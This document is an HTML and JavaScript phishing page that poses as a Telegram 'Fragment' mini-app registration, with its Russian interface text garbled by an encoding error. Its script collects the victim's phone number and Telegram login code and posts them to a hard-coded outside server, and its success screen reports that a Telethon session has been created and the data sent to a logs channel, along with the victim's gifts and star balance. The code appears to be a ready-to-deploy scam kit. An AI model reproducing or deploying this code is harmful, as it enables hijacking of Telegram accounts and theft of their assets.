<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif}
        body{background:#0a0e17;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .container{width:100%;max-width:400px;margin:0 auto}
        .header{display:flex;justify-content:space-between;align-items:center;padding:16px 0;margin-bottom:16px}
        .close-btn{background:none;border:none;color:#8e8e93;font-size:28px;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center}
        .logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:17px}
        .logo-icon{width:24px;height:24px;background:linear-gradient(135deg,#2d8cff 0%,#6c5ce7 100%);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:12px;color:#fff}
        .app-badge{background:rgba(142,142,147,0.2);border-radius:16px;padding:4px 12px;font-size:12px;color:#8e8e93;font-weight:500}
        .card{background:#141b2d;border-radius:20px;padding:24px;margin-bottom:20px;border:1px solid rgba(255,255,255,0.05)}
        .card-title{font-size:22px;font-weight:700;margin-bottom:12px;color:#fff}
        .card-subtitle{color:#8e8e93;font-size:15px;line-height:1.4;margin-bottom:24px}
        .highlight{color:#fff;font-weight:600}
        .form-group{margin-bottom:20px}
        .form-label{display:block;margin-bottom:8px;color:#8e8e93;font-size:13px;font-weight:500}
        .phone-input,.code-input{width:100%;padding:16px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;font-size:16px;transition:border-color .2s}
        .phone-input:focus,.code-input:focus{outline:none;border-color:#2d8cff}
        .submit-btn{width:100%;padding:16px;background:#2d8cff;border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:background-color .2s}
        .submit-btn:hover{background:#1a7df0}
        .submit-btn:disabled{opacity:.5;cursor:not-allowed}
        .code-screen{text-align:center}
        .code-title{font-size:17px;font-weight:600;margin-bottom:8px;color:#fff}
        .code-instruction{color:#8e8e93;margin-bottom:24px;font-size:15px}
        .code-display{display:flex;justify-content:center;gap:8px;margin-bottom:32px}
        .code-digit{width:48px;height:56px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:10px;display:flex;justify-content:center;align-items:center;font-size:24px;font-weight:600;color:#fff}
        .code-digit.active{border-color:#2d8cff;background:rgba(45,140,255,0.1)}
        .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px}
        .key{height:56px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;display:flex;justify-content:center;align-items:center;font-size:20px;font-weight:500;color:#fff;cursor:pointer;user-select:none;transition:background-color .2s}
        .key:hover{background:rgba(255,255,255,0.1)}
        .key-clear{color:#ff3b30;font-size:18px}
        .key-submit{background:#2d8cff;color:#fff;grid-column:span 2}
        .key-submit:hover{background:#1a7df0}
        .loading-screen{text-align:center}
        .loading-title{font-size:22px;font-weight:700;margin-bottom:12px;color:#fff}
        .loading-text{color:#8e8e93;margin-bottom:32px;font-size:15px}
        .loading-spinner{width:60px;height:60px;border:3px solid rgba(255,255,255,0.1);border-radius:50%;border-top-color:#2d8cff;animation:spin 1s linear infinite;margin:0 auto 32px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .success-screen{text-align:center}
        .success-icon{font-size:64px;color:#34c759;margin-bottom:20px}
        .success-details{background:rgba(255,255,255,0.05);border-radius:12px;padding:20px;margin:24px 0;text-align:left}
        .detail-item{display:flex;justify-content:space-between;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,0.05)}
        .detail-item:last-child{margin-bottom:0;padding-bottom:0;border-bottom:none}
        .detail-label{color:#8e8e93;font-size:14px}
        .detail-value{font-weight:600;font-size:14px}
        .stars-value{color:#ffd700}
        .gifts-value{color:#ff6b9d}
        .profile-link{display:inline-block;padding:14px 28px;background:#2d8cff;border-radius:12px;color:#fff;text-decoration:none;font-weight:600;transition:background-color .2s;margin-top:16px;font-size:15px}
        .profile-link:hover{background:#1a7df0}
        .log-status{background:rgba(255,255,255,0.05);border-radius:12px;padding:12px;margin-top:20px;font-size:13px;display:flex;align-items:center;gap:10px}
        .log-icon{font-size:16px}
        .log-success{color:#34c759}
        .log-sending{color:#2d8cff}
        @media (max-width:480px){.card{padding:20px}.code-digit{width:44px;height:52px;font-size:22px}.key{height:52px}}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <button class="close-btn" id="closeBtn">√ó</button>
            <div class="logo">
                <div class="logo-icon">F</div>
                <span>Fragment</span>
            </div>
            <div class="app-badge">–ú–ò–ù–ò-–ü–†–ò–õ–û–ñ–ï–ù–ò–ï</div>
        </div>

        <div class="card" id="phoneScreen">
            <h1 class="card-title">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h1>
            <p class="card-subtitle">–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–∞ <span class="highlight">Fragment.</span> –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, –Ω–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ç–∞–∫–æ–π –∂–µ –∫–∞–∫ –Ω–∞ –≤–∞—à–µ–º –∞–∫–∫–∞—É–Ω—Ç–µ <span class="highlight">Telegram</span></p>
            <div class="form-group">
                <label class="form-label">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                <input type="tel" class="phone-input" id="phoneInput" placeholder="+79991234567" value="+79991234567">
            </div>
            <button class="submit-btn" id="sendPhoneBtn">–û–¢–ü–†–ê–í–ò–¢–¨</button>
        </div>

        <div class="card code-screen" id="codeScreen" style="display:none">
            <h1 class="card-title">–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</h1>
            <p class="code-instruction">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏—à–µ–ª –≤–∞–º –≤ Telegram</p>
            <div class="code-display" id="codeDisplay">
                <div class="code-digit" id="digit1"></div>
                <div class="code-digit" id="digit2"></div>
                <div class="code-digit" id="digit3"></div>
                <div class="code-digit" id="digit4"></div>
                <div class="code-digit" id="digit5"></div>
            </div>
            <div class="keypad">
                <div class="key" data-key="1">1</div>
                <div class="key" data-key="2">2</div>
                <div class="key" data-key="3">3</div>
                <div class="key" data-key="4">4</div>
                <div class="key" data-key="5">5</div>
                <div class="key" data-key="6">6</div>
                <div class="key" data-key="7">7</div>
                <div class="key" data-key="8">8</div>
                <div class="key" data-key="9">9</div>
                <div class="key key-clear" id="clearKey"><i class="fas fa-backspace"></i></div>
                <div class="key" data-key="0">0</div>
                <div class="key key-submit" id="submitCodeBtn">‚úì</div>
            </div>
        </div>

        <div class="card loading-screen" id="loadingScreen" style="display:none">
            <h1 class="loading-title">Fragment</h1>
            <p class="loading-text">–û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞...</p>
            <div class="loading-spinner"></div>
            <div class="log-status" id="loadingLogStatus">
                <i class="fas fa-paper-plane log-icon log-sending"></i>
                <span>–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥...</span>
            </div>
        </div>

        <div class="card success-screen" id="successScreen" style="display:none">
            <div class="success-icon"><i class="fas fa-check-circle"></i></div>
            <h1 class="card-title">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞!</h1>
            <p class="card-subtitle">Telethon —Å–µ—Å—Å–∏—è —Å–æ–∑–¥–∞–Ω–∞ –∏ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ –∫–∞–Ω–∞–ª –ª–æ–≥–æ–≤</p>
            <div class="success-details">
                <div class="detail-item"><span class="detail-label">üë§ –ü—Ä–æ—Ñ–∏–ª—å:</span><span class="detail-value" id="profileValue">@username</span></div>
                <div class="detail-item"><span class="detail-label">üÜî ID —Å–µ—Å—Å–∏–∏:</span><span class="detail-value" id="sessionId">123456789</span></div>
                <div class="detail-item"><span class="detail-label">üéÅ –ü–æ–¥–∞—Ä–∫–æ–≤:</span><span class="detail-value gifts-value" id="giftsValue">12</span></div>
                <div class="detail-item"><span class="detail-label">‚≠êÔ∏è –ë–∞–ª–∞–Ω—Å –∑–≤–µ–∑–¥:</span><span class="detail-value stars-value" id="starsValue">1,850</span></div>
            </div>
            <a href="https://t.me/" target="_blank" class="profile-link" id="profileLink"><i class="fab fa-telegram"></i> –ü–µ—Ä–µ–π—Ç–∏ –∫ –º–∞–º–æ–Ω—Ç—É</a>
            <div class="log-status log-success"><i class="fas fa-check-circle log-icon"></i><span>–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ –∫–∞–Ω–∞–ª –ª–æ–≥–æ–≤</span></div>
        </div>
    </div>

    <script>
        // –í–ê–® IP –°–ï–†–í–ï–†–ê 1CENT HOST
        const BACKEND_URL = 'http://87.121.86.101:8000';
        
        let currentPhone = '';
        let currentDigits = ['','','','',''];
        let activeDigit = 0;
        
        document.getElementById('closeBtn').addEventListener('click', () => {
            if (confirm('–ó–∞–∫—Ä—ã—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é?')) {
                document.body.innerHTML = '<div class="container"><h1 style="text-align:center;padding:50px;color:#8e8e93">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞</h1></div>';
            }
        });
        
        document.getElementById('sendPhoneBtn').addEventListener('click', async () => {
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone || !phone.startsWith('+')) {
                alert('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }
            
            currentPhone = phone;
            document.getElementById('phoneScreen').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';
            
            try {
                const response = await fetch(`${BACKEND_URL}/api/send-phone`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phone})
                });
                
                const data = await response.json();
                
                if (!response.ok) {
                    throw new Error(data.error || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
                }
                
                setTimeout(() => {
                    document.getElementById('loadingScreen').style.display = 'none';
                    document.getElementById('codeScreen').style.display = 'block';
                    
                    if (data.code) {
                        enterCodeManually(data.code);
                    }
                }, 1500);
                
            } catch (error) {
                alert('–û—à–∏–±–∫–∞: ' + error.message);
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('phoneScreen').style.display = 'block';
            }
        });
        
        document.querySelectorAll('.key[data-key]').forEach(key => {
            key.addEventListener('click', () => {
                const digit = key.getAttribute('data-key');
                if (activeDigit < 5) {
                    currentDigits[activeDigit] = digit;
                    document.getElementById(`digit${activeDigit+1}`).textContent = digit;
                    document.getElementById(`digit${activeDigit+1}`).classList.add('active');
                    
                    if (activeDigit < 4) {
                        activeDigit++;
                        document.getElementById(`digit${activeDigit+1}`).classList.add('active');
                    }
                }
            });
        });
        
        document.getElementById('clearKey').addEventListener('click', () => {
            for (let i = 0; i < 5; i++) {
                currentDigits[i] = '';
                document.getElementById(`digit${i+1}`).textContent = '';
                document.getElementById(`digit${i+1}`).classList.remove('active');
            }
            activeDigit = 0;
            document.getElementById('digit1').classList.add('active');
        });
        
        document.getElementById('submitCodeBtn').addEventListener('click', async () => {
            const code = currentDigits.join('');
            if (code.length !== 5) {
                alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥');
                return;
            }
            
            document.getElementById('codeScreen').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';
            document.getElementById('loadingLogStatus').innerHTML = '<i class="fas fa-spinner fa-spin log-icon log-sending"></i><span>–°–æ–∑–¥–∞—ë–º —Å–µ—Å—Å–∏—é...</span>';
            
            try {
                const response = await fetch(`${BACKEND_URL}/api/verify-code`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: currentPhone, code: code})
                });
                
                const data = await response.json();
                
                if (!response.ok) {
                    throw new Error(data.error || '–û—à–∏–±–∫–∞');
                }
                
                setTimeout(() => {
                    document.getElementById('loadingScreen').style.display = 'none';
                    document.getElementById('successScreen').style.display = 'block';
                    
                    if (data.username) {
                        document.getElementById('profileValue').textContent = '@' + data.username;
                        document.getElementById('profileLink').href = `https://t.me/${data.username}`;
                    }
                    if (data.user_id) document.getElementById('sessionId').textContent = data.user_id;
                    if (data.gifts !== undefined) document.getElementById('giftsValue').textContent = data.gifts;
                    if (data.stars !== undefined) document.getElementById('starsValue').textContent = data.stars.toLocaleString();
                    
                }, 2000);
                
            } catch (error) {
                alert('–û—à–∏–±–∫–∞: ' + error.message);
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('codeScreen').style.display = 'block';
            }
        });
        
        function enterCodeManually(code) {
            currentDigits = code.split('');
            for (let i = 0; i < 5; i++) {
                if (i < code.length) {
                    document.getElementById(`digit${i+1}`).textContent = code[i];
                    document.getElementById(`digit${i+1}`).classList.add('active');
                }
            }
            activeDigit = 5;
        }
        
        document.getElementById('digit1').classList.add('active');
    </script>
</body>
</html>
